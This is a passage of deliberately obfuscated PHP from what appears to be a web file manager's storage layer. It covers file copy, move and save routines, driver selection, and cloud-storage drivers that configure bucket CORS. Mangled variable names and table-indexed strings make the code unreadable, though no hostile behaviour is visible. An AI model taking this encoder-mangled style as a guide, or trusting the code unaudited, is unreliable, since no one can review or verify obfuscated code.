Hook::trigger($’‹×¾­“[1255] . $Ôš£¼Ì· . $’‹×¾­“[1256], $æ”œ¿“½); $¼Öú¥ğß = self::copyMove($Íù§‰½Ê, $ÜµóĞì¥, $“âùğƒ, $Ôš£¼Ì·, $Şù÷—ÍŒ); Hook::trigger($’‹×¾­“[1255] . $Ôš£¼Ì· . $’‹×¾­“[1258], $æ”œ¿“½, $¼Öú¥ğß); return $¼Öú¥ğß; } public static function saveFile($¾ÕÔ–‹‰, $ç¢¦¥Àø, $ÜâÜœê = true) { $š˜ÃÅ“¿ =& $_SERVER[ÓïÕü]; $˜‰›É = self::info($ç¢¦¥Àø); $½áÃíè‚ = self::driverMake($¾ÕÔ–‹‰); $…é×ÆÔú = self::driverMake($ç¢¦¥Àø); $ùòÚÀƒß = !1; if ($…é×ÆÔú->pathParse[$š˜ÃÅ“¿[1259]]) { $ùòÚÀƒß = $…é×ÆÔú; $ÂÍ³Â¸± = $…é×ÆÔú->pathParse[$š˜ÃÅ“¿[1259]]; $…é×ÆÔú = self::driverMake($ÂÍ³Â¸±); } if ($½áÃíè‚->pathParse[$š˜ÃÅ“¿[1259]]) { $èªÏŞœº = $½áÃíè‚->pathParse[$š˜ÃÅ“¿[1259]]; $½áÃíè‚ = self::driverMake($èªÏŞœº); } $›Š«éïı = $…é×ÆÔú->pathFather($ç¢¦¥Àø); $±Í¡¥•ı = !0; if (!$ÜâÜœê && self::driverIsSame($½áÃíè‚, $…é×ÆÔú)) { $±Í¡¥•ı = !1; } $²ôº‰¥¼ = self::copyFile($½áÃíè‚, $¾ÕÔ–‹‰, $…é×ÆÔú, $›Š«éïı, $˜‰›É[$š˜ÃÅ“¿[32]], $±Í¡¥•ı); if ($ùòÚÀƒß) { $²ôº‰¥¼ = $ùòÚÀƒß->getPathOuter($²ôº‰¥¼); } return $²ôº‰¥¼; } private static function copyMove($»ØÑ˜Ïï, $µ¥„ğÒÚ, $êç¹„”, $ò÷«äøË, $–ùØß²³ = false) { $÷°ÃÊÂ– =& $_SERVER[ÓïÕü]; if (!$»ØÑ˜Ïï || $»ØÑ˜Ïï == $÷°ÃÊÂ–[8] || !$µ¥„ğÒÚ) { return !1; } ignore_timeout(); $Ùê²®ù = self::driverMake($»ØÑ˜Ïï); $Œ’òüÈÑ = self::driverMake($µ¥„ğÒÚ); $ìºË• = $ò÷«äøË == $÷°ÃÊÂ–[628]; $‘³µø£ = !1; if ($Œ’òüÈÑ->pathParse[$÷°ÃÊÂ–[1259]]) { $‘³µø£ = $Œ’òüÈÑ; $µ¥„ğÒÚ = $Œ’òüÈÑ->pathParse[$÷°ÃÊÂ–[1259]]; $Œ’òüÈÑ = self::driverMake($µ¥„ğÒÚ); } if ($Ùê²®ù->pathParse[$÷°ÃÊÂ–[1259]]) { $»ØÑ˜Ïï = $Ùê²®ù->pathParse[$÷°ÃÊÂ–[1259]]; $Ùê²®ù = self::driverMake($»ØÑ˜Ïï); } self::check($Ùê²®ù, $»ØÑ˜Ïï, $Œ’òüÈÑ, $µ¥„ğÒÚ); Hook::trigger($÷°ÃÊÂ–[1260], $Ùê²®ù, $»ØÑ˜Ïï, $Œ’òüÈÑ, $µ¥„ğÒÚ); $šÃ´³ªì = self::driverIsSame($Ùê²®ù, $Œ’òüÈÑ); if ($šÃ´³ªì) { if ($ò÷«äøË == $÷°ÃÊÂ–[628] && !method_exists($Œ’òüÈÑ, $÷°ÃÊÂ–[1261]) && trim($µ¥„ğÒÚ, $÷°ÃÊÂ–[8]) == trim($Œ’òüÈÑ->pathFather($»ØÑ˜Ïï), $÷°ÃÊÂ–[8])) { if ($Ùê²®ù->pathThis($»ØÑ˜Ïï) != $–ùØß²³ && !$Ùê²®ù->isOsDriver()) { return $Ùê²®ù->rename($»ØÑ˜Ïï, $–ùØß²³); } return $Œ’òüÈÑ->getPathOuter($»ØÑ˜Ïï); } if (method_exists($Œ’òüÈÑ, $ò÷«äøË)) { return $Œ’òüÈÑ->{$ò÷«äøË}($»ØÑ˜Ïï, $µ¥„ğÒÚ, $êç¹„”, $–ùØß²³); } } if ($šÃ´³ªì && $ò÷«äøË == $÷°ÃÊÂ–[628] && $Œ’òüÈÑ->getType() == $÷°ÃÊÂ–[109]) { $ÉŞ‚ôÔ = $Œ’òüÈÑ->movePath($»ØÑ˜Ïï, $µ¥„ğÒÚ, $–ùØß²³); if ($ÉŞ‚ôÔ) { return $ÉŞ‚ôÔ; } } $®ÅÊ×˜ = $Ùê²®ù->isFile($»ØÑ˜Ïï); if (!$®ÅÊ×˜ && $Œ’òüÈÑ->getType() == $÷°ÃÊÂ–[848] && $Ùê²®ù->getType() == $÷°ÃÊÂ–[109]) { $ÉŞ‚ôÔ = $Œ’òüÈÑ->copyFolderFromIO($Ùê²®ù, $»ØÑ˜Ïï, $µ¥„ğÒÚ, $êç¹„”, $ìºË•, $–ùØß²³); } else { $ÉŞ‚ôÔ = self::copyPath($Ùê²®ù, $»ØÑ˜Ïï, $Œ’òüÈÑ, $µ¥„ğÒÚ, $êç¹„”, $ìºË•, $®ÅÊ×˜, $–ùØß²³); } if ($ÉŞ‚ôÔ && $ìºË•) { $Ùê²®ù->remove($»ØÑ˜Ïï); } if ($‘³µø£) { $ÉŞ‚ôÔ = $‘³µø£->getPathOuter($ÉŞ‚ôÔ); } return $ÉŞ‚ôÔ; } private static function check($÷Í…Ç, $ÔâéõÀ´, $–¦ÇØØØ, &$¡áèƒã) { $¬¥Ø’Ú„ =& $_SERVER[ÓïÕü]; if (self::driverIsSame($÷Í…Ç, $–¦ÇØØØ) && $÷Í…Ç->isFolder($ÔâéõÀ´) && $÷Í…Ç->isParentOf($ÔâéõÀ´, $¡áèƒã)) { show_json(LNG($¬¥Ø’Ú„[1262]), !1); } if (!$÷Í…Ç->exist($ÔâéõÀ´)) { show_json(LNG($¬¥Ø’Ú„[108]), !1); } } private static function copyPath($êšØ¡Ù, $ìôç³¬, $”ëâæĞœ, $şÓØ…Ûƒ, $İæ÷¡¬š, $×‘Ëä“, $ÓÏÍ•Ú¢, $¿û‹ˆ¸Ğ = false, $¥¸×Ö¼ = true) { $À½­–ıâ =& $_SERVER[ÓïÕü]; $÷Ğ˜Ë©Ï = empty($¿û‹ˆ¸Ğ) && $¿û‹ˆ¸Ğ !== $À½­–ıâ[231] ? $êšØ¡Ù->pathThis($ìôç³¬) : $¿û‹ˆ¸Ğ; if ($İæ÷¡¬š) { $”ÃøÇç = $”ëâæĞœ->fileNameExist($şÓØ…Ûƒ, $÷Ğ˜Ë©Ï); $Úû§¦‚ï = $÷Ğ˜Ë©Ï; $÷Ğ˜Ë©Ï = $”ëâæĞœ->fileNameAuto($şÓØ…Ûƒ, $÷Ğ˜Ë©Ï, $İæ÷¡¬š, !$ÓÏÍ•Ú¢); if (!$”ÃøÇç || $Úû§¦‚ï != $÷Ğ˜Ë©Ï) { $İæ÷¡¬š = !1; } if ($¥¸×Ö¼ && !$İæ÷¡¬š) { $”ëâæĞœ->_data[$À½­–ıâ[1263]] = !0; } } if ($ÓÏÍ•Ú¢) { return self::copyFile($êšØ¡Ù, $ìôç³¬, $”ëâæĞœ, $şÓØ…Ûƒ, $÷Ğ˜Ë©Ï, $×‘Ëä“); } if ($İæ÷¡¬š == REPEAT_RENAME_FOLDER) { $İæ÷¡¬š = !1; } $é³Ö¯•¨ = rtrim($şÓØ…Ûƒ, $À½­–ıâ[8]) . $À½­–ıâ[8] . $÷Ğ˜Ë©Ï; $…ø•™ÙÖ = $”ëâæĞœ->mkdir($”ëâæĞœ->getPath($é³Ö¯•¨), $İæ÷¡¬š); $şÓØ…Ûƒ = $”ëâæĞœ->getPathInner($…ø•™ÙÖ); $ÕŒÒÎâì = $êšØ¡Ù->listPath($ìôç³¬, !0); $ÕŒÒÎâì = is_array($ÕŒÒÎâì) ? $ÕŒÒÎâì : array($À½­–ıâ[86] => array(), $À½­–ıâ[85] => array()); $Åû‰¤¡’ = array_merge($ÕŒÒÎâì[$À½­–ıâ[86]], $ÕŒÒÎâì[$À½­–ıâ[85]]); foreach ($Åû‰¤¡’ as $ƒ ±´ù™) { $Šœğ÷Äª = $ƒ ±´ù™[$À½­–ıâ[33]] == $À½­–ıâ[233]; $ìôç³¬ = $êšØ¡Ù->getPathInner($ƒ ±´ù™[$À½­–ıâ[87]]); $ØµÀ™îõ = self::copyPath($êšØ¡Ù, $ìôç³¬, $”ëâæĞœ, $şÓØ…Ûƒ, $İæ÷¡¬š, $×‘Ëä“, $Šœğ÷Äª, !1, !1); if (!$ØµÀ™îõ) { IO::errorTips($À½­–ıâ[1264] . $ìôç³¬ . $À½­–ıâ[73] . $şÓØ…Ûƒ); } } self::copyMoveKeepInfo($êšØ¡Ù, $ìôç³¬, $…ø•™ÙÖ); return $…ø•™ÙÖ; } private static function copyFile($®ŠÕŸıœ, $›·†®Ù÷, $©ÆÑ‰†ù, $ç·à›‚¼, $¤Ÿ¢¡Ö­, $¥ˆ¸¢Ú) { $±·ûÑ‡ø =& $_SERVER[ÓïÕü]; $ç·à›‚¼ = $©ÆÑ‰†ù->getPath(rtrim($ç·à›‚¼, $±·ûÑ‡ø[8]) . $±·ûÑ‡ø[8] . $¤Ÿ¢¡Ö­); $ó¢ĞÍÁÔ = $±·ûÑ‡ø[1265] . time() . rand_string(5); Hook::trigger($±·ûÑ‡ø[1266], $®ŠÕŸıœ, $›·†®Ù÷, $©ÆÑ‰†ù, $ç·à›‚¼, $¤Ÿ¢¡Ö­, $ó¢ĞÍÁÔ); if (self::driverIsSame($®ŠÕŸıœ, $©ÆÑ‰†ù)) { if ($¥ˆ¸¢Ú) { $î³²½î = $©ÆÑ‰†ù->moveFile($›·†®Ù÷, $ç·à›‚¼); } else { $î³²½î = $©ÆÑ‰†ù->copyFile($›·†®Ù÷, $ç·à›‚¼); } Hook::trigger($±·ûÑ‡ø[1267], $®ŠÕŸıœ, $›·†®Ù÷, $©ÆÑ‰†ù, $ç·à›‚¼, $¤Ÿ¢¡Ö­, $î³²½î); self::copyMoveKeepInfo($®ŠÕŸıœ, $›·†®Ù÷, $î³²½î); return $î³²½î; } $ó‰‡‹â = TEMP_FILES; if ($GLOBALS[$±·ûÑ‡ø[6]][$±·ûÑ‡ø[92]][$±·ûÑ‡ø[889]]) { $ó‰‡‹â = $GLOBALS[$±·ûÑ‡ø[6]][$±·ûÑ‡ø[92]][$±·ûÑ‡ø[889]]; } $¶Íüö”â = $ó‰‡‹â; mk_dir($¶Íüö”â); $ø¥æœì = $¶Íüö”â . $ó¢ĞÍÁÔ; $õî°Ñíì = $ø¥æœì; $ø¥æœì = $®ŠÕŸıœ->download($›·†®Ù÷, $ø¥æœì); $ø¥æœì = $®ŠÕŸıœ->iconvApp($ø¥æœì); if (substr($ø¥æœì, strlen($ó‰‡‹â)) == $ó‰‡‹â) { $¥ˆ¸¢Ú = !0; } $î³²½î = $©ÆÑ‰†ù->upload($ç·à›‚¼, $ø¥æœì, $¥ˆ¸¢Ú); self::remove($õî°Ñíì); Hook::trigger($±·ûÑ‡ø[1267], $®ŠÕŸıœ, $›·†®Ù÷, $©ÆÑ‰†ù, $ç·à›‚¼, $¤Ÿ¢¡Ö­, $î³²½î); self::copyMoveKeepInfo($®ŠÕŸıœ, $›·†®Ù÷, $î³²½î); return $î³²½î; } private static function copyMoveKeepInfo($±Èé§Ğ„, $…êÓ³œÓ, $¤Ï›”™¨) { if (!$¤Ï›”™¨) { return; } $”¼Ÿ¶¼î = $±Èé§Ğ„->info($…êÓ³œÓ); if (!is_array($”¼Ÿ¶¼î)) { return; } IO::setModifyTime($¤Ï›”™¨, $”¼Ÿ¶¼î[$_SERVER[ÓïÕü][88]]); } public static function pathFather($Äï¬¯ˆ¶) { $†¼¾ÑÒ = IO::init($Äï¬¯ˆ¶); $éğãæ°¯ = $†¼¾ÑÒ->pathFather($†¼¾ÑÒ->path); return $†¼¾ÑÒ->getPathOuter($éğãæ°¯); } public static function fileOut($œƒ“ù·, $ƒšñÀ¢‚ = false, $ØÎô¡« = false, $œÄ¿ï­ = '') { $§ğî‘˜¹ = self::driverMake($œƒ“ù·); if ($§ğî‘˜¹->isFileOutServer()) { return $§ğî‘˜¹->fileOutServer($œƒ“ù·, $ƒšñÀ¢‚, $ØÎô¡«, $œÄ¿ï­); } return $§ğî‘˜¹->fileOut($œƒ“ù·, $ƒšñÀ¢‚, $ØÎô¡«, $œÄ¿ï­); } public static function fileOutImage($‚˜‘í›», $¶µ¸ÕŸõ = 250) { $†ı»¿…Ü = array(250, 600, 1200, 2000, 3000, 5000); for ($…àÍ¾Ñ· = 0; $…àÍ¾Ñ· < count($†ı»¿…Ü); $…àÍ¾Ñ·++) { if ($…àÍ¾Ñ· == 0 && $¶µ¸ÕŸõ <= $†ı»¿…Ü[$…àÍ¾Ñ·]) { $¶µ¸ÕŸõ = $†ı»¿…Ü[$…àÍ¾Ñ·]; break; } else { if ($¶µ¸ÕŸõ > $†ı»¿…Ü[$…àÍ¾Ñ· - 1] && $¶µ¸ÕŸõ <= $†ı»¿…Ü[$…àÍ¾Ñ·]) { $¶µ¸ÕŸõ = $†ı»¿…Ü[$…àÍ¾Ñ·]; break; } else { if ($…àÍ¾Ñ· == count($†ı»¿…Ü) - 1 && $¶µ¸ÕŸõ > $†ı»¿…Ü[$…àÍ¾Ñ·]) { $¶µ¸ÕŸõ = $†ı»¿…Ü[$…àÍ¾Ñ·]; break; } } } } $åË§è = self::driverMake($‚˜‘í›»); if ($åË§è->isFileOutServer()) { return $åË§è->fileOutImageServer($‚˜‘í›», $¶µ¸ÕŸõ); } return $åË§è->fileOutImage($‚˜‘í›», $¶µ¸ÕŸõ); } private static function driverIsSame($èÀÍ¦€, $‹Üãº•Ş) { $Õè¢÷– =& $_SERVER[ÓïÕü]; $İ±§©Èæ = $èÀÍ¦€->getType(); $©ÉŠœúò = $‹Üãº•Ş->getType(); if ($İ±§©Èæ != $©ÉŠœúò) { return !1; } if ($İ±§©Èæ == $Õè¢÷–[848]) { return !0; } if ($İ±§©Èæ == $Õè¢÷–[109]) { return !0; } if ($èÀÍ¦€->pathDriver == $‹Üãº•Ş->pathDriver) { return !0; } return !1; } public static function copyUpdate($û¼¡Ö•–, $è›Ò•½ç) { $ûÈÚÇ€û =& $_SERVER[ÓïÕü]; if (!IO::exist($û¼¡Ö•–)) { return !1; } if (!IO::exist($è›Ò•½ç)) { IO::mkdir($è›Ò•½ç); } $‘§š¬­ = array_to_keyvalue(self::listAllSimple($û¼¡Ö•–), $ûÈÚÇ€û[87]); $ûüÜâ“Š = array_to_keyvalue(self::listAllSimple($è›Ò•½ç), $ûÈÚÇ€û[87]); $ÔÎœïæ« = array(); $ÚôÑ˜¿ø = array(); foreach ($‘§š¬­ as $ÇÑ€İÅ¶ => $ÈÛá ²ó) { if (isset($ûüÜâ“Š[$ÇÑ€İÅ¶])) { if ($ÈÛá ²ó[$ûÈÚÇ€û[78]] == 1) { continue; } if ($ûüÜâ“Š[$ÇÑ€İÅ¶][$ûÈÚÇ€û[79]] == $ÈÛá ²ó[$ûÈÚÇ€û[79]]) { continue; } } if ($ÈÛá ²ó[$ûÈÚÇ€û[78]] == 1) { $ÚôÑ˜¿ø[] = $è›Ò•½ç . $ûÈÚÇ€û[8] . trim($ÇÑ€İÅ¶, $ûÈÚÇ€û[8]); continue; } $²Í­åš‰ = strstr(trim($ÇÑ€İÅ¶, $ûÈÚÇ€û[8]), $ûÈÚÇ€û[8]) ? get_path_father($ÇÑ€İÅ¶) : $ûÈÚÇ€û[12]; $ÔÎœïæ«[] = array($ûÈÚÇ€û[1268] => $ÈÛá ²ó[$ûÈÚÇ€û[89]], $ûÈÚÇ€û[1269] => rtrim($è›Ò•½ç, $ûÈÚÇ€û[8]) . $ûÈÚÇ€û[8] . $²Í­åš‰, $ûÈÚÇ€û[1270] => $ÈÛá ²ó); } $³àÂÅí = array($ûÈÚÇ€û[233] => $ÔÎœïæ«, $ûÈÚÇ€û[78] => $ÚôÑ˜¿ø); Hook::trigger($ûÈÚÇ€û[1271], $û¼¡Ö•–, $è›Ò•½ç, $³àÂÅí); foreach ($ÚôÑ˜¿ø as $ÈÛá ²ó) { IO::mkdir($ÈÛá ²ó); } foreach ($ÔÎœïæ« as $ÈÛá ²ó) { IO::copy($ÈÛá ²ó[$ûÈÚÇ€û[1268]], $ÈÛá ²ó[$ûÈÚÇ€û[1269]], REPEAT_REPLACE); } } public static function fileSubstr($“†£ÀÍ, $€ÑˆœáÌ, $»ú”´Šû = false) { $ğ®ß…ªœ =& $_SERVER[ÓïÕü]; $œÃ©áó† = self::driverMake($“†£ÀÍ); $£Ù¹°°Å = $œÃ©áó†->size($“†£ÀÍ); $š·Â¢û³ = $€ÑˆœáÌ; $’ÔÙÑ÷ = $»ú”´Šû; if ($€ÑˆœáÌ < 0) { $€ÑˆœáÌ = $£Ù¹°°Å + $€ÑˆœáÌ; } if ($»ú”´Šû === !1) { $»ú”´Šû = $£Ù¹°°Å - $€ÑˆœáÌ; } if ($€ÑˆœáÌ + $»ú”´Šû > $£Ù¹°°Å) { $»ú”´Šû = $£Ù¹°°Å - $€ÑˆœáÌ; } if (!$£Ù¹°°Å && $œÃ©áó†->getType() == $ğ®ß…ªœ[109] && !$œÃ©áó†->exist($“†£ÀÍ)) { $¬ø¥¥ì = get_path_this($“†£ÀÍ); $Œ¢’Š¯¸ = parse_url_query($¬ø¥¥ì); if (is_array($Œ¢’Š¯¸) && isset($Œ¢’Š¯¸[$ğ®ß…ªœ[32]])) { $¬ø¥¥ì = urldecode($Œ¢’Š¯¸[$ğ®ß…ªœ[32]]); } throw new Exception($ğ®ß…ªœ[1272] . LNG($ğ®ß…ªœ[1273]) . $ğ®ß…ªœ[1070] . clear_html($¬ø¥¥ì) . $ğ®ß…ªœ[12]); } if ($»ú”´Šû <= 0) { return $ğ®ß…ªœ[12]; } if ($€ÑˆœáÌ < 0 || $€ÑˆœáÌ >= $£Ù¹°°Å || $»ú”´Šû > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\145\122\145\141\x64\x20\x65\162\x72\x6f\162\x21\40\x73\164\141\x72\x74\x3d{$€ÑˆœáÌ}\73\154\145\156\147\164\x68\75{$»ú”´Šû}\x3b\40\163\x69\x7a\x65\x3d{$£Ù¹°°Å}\73"); } $ÀÈÒ¶Ã = $œÃ©áó†->fileSubstr($“†£ÀÍ, $€ÑˆœáÌ, $»ú”´Šû); if (!$ÀÈÒ¶Ã && $»ú”´Šû && isset($GLOBALS[$ğ®ß…ªœ[1274]])) { throw new Exception($GLOBALS[$ğ®ß…ªœ[1274]][$ğ®ß…ªœ[1275]]); } return $ÀÈÒ¶Ã; } private static function driverMake(&$‘Ø³’û) { $ıôŒÆÆ  =& $_SERVER[ÓïÕü]; $áè…£ºâ = KodIO::parse($‘Ø³’û); if (!self::$driverListSystem) { $àèÚßá€ = Model($ıôŒÆÆ [858])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($àèÚßá€, $ıôŒÆÆ [478]); } if ($áè…£ºâ[$ıôŒÆÆ [33]] == KodIO::KOD_IO && !self::$driverListSystem[$áè…£ºâ[$ıôŒÆÆ [478]]]) { throw new Exception($ıôŒÆÆ [1276]); return !1; } $‘Ø³’û = $áè…£ºâ[$ıôŒÆÆ [1277]]; $úØÄã–š = self::driverGet($áè…£ºâ, $‘Ø³’û); return $úØÄã–š; } private static function driverGet($œ†é©ãÕ, &$ÙÃ°ƒ™´) { $½‹£¿™È =& $_SERVER[ÓïÕü]; $©ê¨ú½ = $œ†é©ãÕ[$½‹£¿™È[1278]]; $Á§ùœŸ† = $œ†é©ãÕ[$½‹£¿™È[478]]; switch ($œ†é©ãÕ[$½‹£¿™È[33]]) { case KodIO::KOD_IO: $öóã‰÷Æ = self::$driverListSystem[$Á§ùœŸ†]; break; case KodIO::KOD_SOURCE: $ÙÃ°ƒ™´ = $Á§ùœŸ† . $ÙÃ°ƒ™´; $öóã‰÷Æ = array($½‹£¿™È[1279] => $½‹£¿™È[1280], $½‹£¿™È[6] => $œ†é©ãÕ); $öóã‰÷Æ[$½‹£¿™È[6]][$½‹£¿™È[1281]] = $œ†é©ãÕ[$½‹£¿™È[478]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $í¥ßß½ˆ = $GLOBALS[$½‹£¿™È[1282]]; self::$driverListUser = array_to_keyvalue($í¥ßß½ˆ, $½‹£¿™È[478]); } $öóã‰÷Æ = self::$driverListUser[$Á§ùœŸ†]; break; case KodIO::KOD_SHARE_LINK: $öóã‰÷Æ = array($½‹£¿™È[1279] => $½‹£¿™È[1283], $½‹£¿™È[6] => $œ†é©ãÕ); $¸¹™”ˆˆ = Action($½‹£¿™È[1284])->sharePathInfo($œ†é©ãÕ[$½‹£¿™È[87]]); $ÙÃ°ƒ™´ = $¸¹™”ˆˆ[$½‹£¿™È[194]]; if (!$¸¹™”ˆˆ[$½‹£¿™È[194]]) { $É³ –Å† = Model($½‹£¿™È[672])->getInfo($¸¹™”ˆˆ[$½‹£¿™È[673]]); $ÙÃ°ƒ™´ = KodIO::clear($É³ –Å†[$½‹£¿™È[1285]] . $œ†é©ãÕ[$½‹£¿™È[1277]]); $œ†é©ãÕ[$½‹£¿™È[565]] = $É³ –Å†; $œ†é©ãÕ[$½‹£¿™È[1259]] = $ÙÃ°ƒ™´; $öóã‰÷Æ = array($½‹£¿™È[1279] => $½‹£¿™È[1286], $½‹£¿™È[6] => $œ†é©ãÕ); } else { $öóã‰÷Æ[$½‹£¿™È[6]][$½‹£¿™È[1281]] = $¸¹™”ˆˆ[$½‹£¿™È[194]]; } break; case KodIO::KOD_SHARE_ITEM: $öóã‰÷Æ = array($½‹£¿™È[1279] => $½‹£¿™È[1287], $½‹£¿™È[6] => $œ†é©ãÕ); $É³ –Å† = Model($½‹£¿™È[672])->getInfo($œ†é©ãÕ[$½‹£¿™È[478]]); if ($É³ –Å†[$½‹£¿™È[194]] == $½‹£¿™È[231]) { $ÙÃ°ƒ™´ = KodIO::clear($É³ –Å†[$½‹£¿™È[1285]] . $œ†é©ãÕ[$½‹£¿™È[1277]]); $œ†é©ãÕ[$½‹£¿™È[565]] = $É³ –Å†; $œ†é©ãÕ[$½‹£¿™È[1259]] = $ÙÃ°ƒ™´; $öóã‰÷Æ = array($½‹£¿™È[1279] => $½‹£¿™È[1288], $½‹£¿™È[6] => $œ†é©ãÕ); } else { if (!$ÙÃ°ƒ™´) { $ÙÃ°ƒ™´ = $É³ –Å†[$½‹£¿™È[194]]; } $öóã‰÷Æ[$½‹£¿™È[6]][$½‹£¿™È[1281]] = $É³ –Å†[$½‹£¿™È[194]]; } break; default: $ÙÃ°ƒ™´ = $œ†é©ãÕ[$½‹£¿™È[87]]; $öóã‰÷Æ = array($½‹£¿™È[1279] => $½‹£¿™È[1289]); break; } $Î†¤’Í” = $œ†é©ãÕ[$½‹£¿™È[87]]; if (!isset(self::$driverCache[$Î†¤’Í”])) { $ŸóŸ§È” = strtolower($öóã‰÷Æ[$½‹£¿™È[98]]); $ğ³ƒ§» = $GLOBALS[$½‹£¿™È[6]][$½‹£¿™È[92]][$½‹£¿™È[922]]; $î–ô®ê = $½‹£¿™È[77] . (isset($ğ³ƒ§»[$ŸóŸ§È”]) ? $ğ³ƒ§»[$ŸóŸ§È”] : ucfirst($ŸóŸ§È”)); if (!class_exists($î–ô®ê)) { show_json("{$î–ô®ê}\x20\156\157\x74\x20\x65\x78\151\x73\164\163\x21", !1); } $½Š²Ş¶É = isset($öóã‰÷Æ[$½‹£¿™È[6]]) ? $öóã‰÷Æ[$½‹£¿™È[6]] : !1; self::$driverCache[$Î†¤’Í”] = new $î–ô®ê($½Š²Ş¶É); } $Ñ‰ı…¥å = self::$driverCache[$Î†¤’Í”]; $Ñ‰ı…¥å->pathDriver = $©ê¨ú½; $Ñ‰ı…¥å->pathBase = $½‹£¿™È[12]; if (isset($öóã‰÷Æ[$½‹£¿™È[6]][$½‹£¿™È[1290]])) { $Ñ‰ı…¥å->pathBase = rtrim($öóã‰÷Æ[$½‹£¿™È[6]][$½‹£¿™È[1290]], $½‹£¿™È[8]) . $½‹£¿™È[8]; $ÙÃ°ƒ™´ = $Ñ‰ı…¥å->pathBase . ltrim($ÙÃ°ƒ™´, $½‹£¿™È[8]); } $ÙÃ°ƒ™´ = $Ñ‰ı…¥å->getPath($ÙÃ°ƒ™´); if (isset($œ†é©ãÕ[$½‹£¿™È[1259]])) { $ÙÃ°ƒ™´ = $œ†é©ãÕ[$½‹£¿™È[1259]]; } $Ñ‰ı…¥å->path = $ÙÃ°ƒ™´; return $Ñ‰ı…¥å; } public static function errorTips($ßÃæ• ½ = false) { $ÎÒñæí‚ =& $_SERVER[ÓïÕü]; static $’í“å§ = array(); $œ¯ŠÑÅı = 1000; if ($ßÃæ• ½ === -1) { return $’í“å§ ? $’í“å§[count($’í“å§) - 1] : $ÎÒñæí‚[12]; } if ($ßÃæ• ½ === !1) { return implode($ÎÒñæí‚[288], $’í“å§); } if (count($’í“å§) >= $œ¯ŠÑÅı) { $’í“å§ = array_slice($’í“å§, $œ¯ŠÑÅı * 0.5, $œ¯ŠÑÅı); } $’í“å§[] = $ßÃæ• ½; write_log($ÎÒñæí‚[176] . ACTION . $ÎÒñæí‚[1291] . $ßÃæ• ½, $ÎÒñæí‚[1292]); } public static function getLastError($‰ïŸë”ğ = '') { $ÄÌìˆÚõ = self::errorTips(-1); return $ÄÌìˆÚõ ? $ÄÌìˆÚõ : $‰ïŸë”ğ; } } goto A×İÉ¸·Ï; F¡­Èã±šˆ: class PathDriverOBS extends PathDriverBaseS3 { public function __construct($‚–¨š¹ü) { parent::__construct($‚–¨š¹ü); $this->setSignVersion($_SERVER[ÓïÕü][250]); } public function fileOutImage($ñŒÖÉŒˆ, $¨şèÍĞ = 250) { $¹„ò»„é =& $_SERVER[ÓïÕü]; if ($this->size($ñŒÖÉŒˆ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ñŒÖÉŒˆ, $¨şèÍĞ); } $ûÂ×âŠ– = array($¹„ò»„é[1495] => $¹„ò»„é[1496] . $¨şèÍĞ . $¹„ò»„é[1497]); $ÆŞüÉ¯£ = $this->link($ñŒÖÉŒˆ, $ûÂ×âŠ–); $this->fileOutLink($ÆŞüÉ¯£); } public function fileOutLink($Ë¨ú×—‹) { $ÃÙŠ÷³ =& $_SERVER[ÓïÕü]; if (substr($Ë¨ú×—‹, 0, 7) == $ÃÙŠ÷³[219]) { $Ë¨ú×—‹ = $ÃÙŠ÷³[220] . substr($Ë¨ú×—‹, 7); } header($ÃÙŠ÷³[175] . $Ë¨ú×—‹); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($¦ÆĞéÚİ) { parent::__construct($¦ÆĞéÚİ); $this->setSignVersion($_SERVER[ÓïÕü][250]); } public function fileOutLink($²Íª¹ª) { $¿ğé‚ìñ =& $_SERVER[ÓïÕü]; if (substr($²Íª¹ª, 0, 7) == $¿ğé‚ìñ[219]) { $²Íª¹ª = $¿ğé‚ìñ[220] . substr($²Íª¹ª, 7); } header($¿ğé‚ìñ[175] . $²Íª¹ª); die; } public function uploadFormData($§ş¡œÁÏ, $õŸ—äŠú = 3600) { return $this->uploadFormDataV2($§ş¡œÁÏ, $õŸ—äŠú); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($™ùôÎ÷) { parent::__construct(); include_once SDK_DIR . $_SERVER[ÓïÕü][1498]; $this->_init($™ùôÎ÷); } public function _init($ı§›Ç×©) { $ŞÅµó–£ =& $_SERVER[ÓïÕü]; $this->config = $ı§›Ç×©; foreach ($ı§›Ç×© as $éß¶Ç£ß => $Ù†ù¤Ğù) { if (isset($this->{$éß¶Ç£ß})) { $this->{$éß¶Ç£ß} = $Ù†ù¤Ğù; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ŞÅµó–£[1499] . LNG($ŞÅµó–£[1500])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $³”Æ¸ =& $_SERVER[ÓïÕü]; $ìã±¸şÛ = new OSS\Model\CorsConfig(); $Ì¥‘‹‘ = new OSS\Model\CorsRule(); $Ì¥‘‹‘->addAllowedOrigin($³”Æ¸[1501]); $Ì¥‘‹‘->addAllowedMethod($³”Æ¸[1502]); $Ì¥‘‹‘->addAllowedMethod($³”Æ¸[1503]); $Ì¥‘‹‘->addAllowedMethod($³”Æ¸[1504]); $Ì¥‘‹‘->addAllowedMethod($³”Æ¸[1505]); $Ì¥‘‹‘->addAllowedMethod($³”Æ¸[165]); $Ì¥‘‹‘->setMaxAgeSeconds(600); $Ì¥‘‹‘->addExposeHeader($³”Æ¸[1506]); $Ì¥‘‹‘->addAllowedHeader($³”Æ¸[1501]); $ìã±¸şÛ->addRule($Ì¥‘‹‘); try { $this->client->putBucketCors($this->bucket, $ìã±¸şÛ); } catch (OSS\Core\OssException $ÃåÜ‡÷®) { $this->writeLog(__FUNCTION__ . $³”Æ¸[215] . $ÃåÜ‡÷®->getMessage()); return !1; } return !0; } public function getBucketCors() { $ìÌ¿ÛÔ¯ =& $_SERVER[ÓïÕü]; $şŠşú¾ = null; try { $şŠşú¾ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $™††¨òê) { $this->writeLog(__FUNCTION__ . $ìÌ¿ÛÔ¯[215] . $™††¨òê->getMessage()); return null; } if (!$şŠşú¾ || !($Ûœé¾“Í = 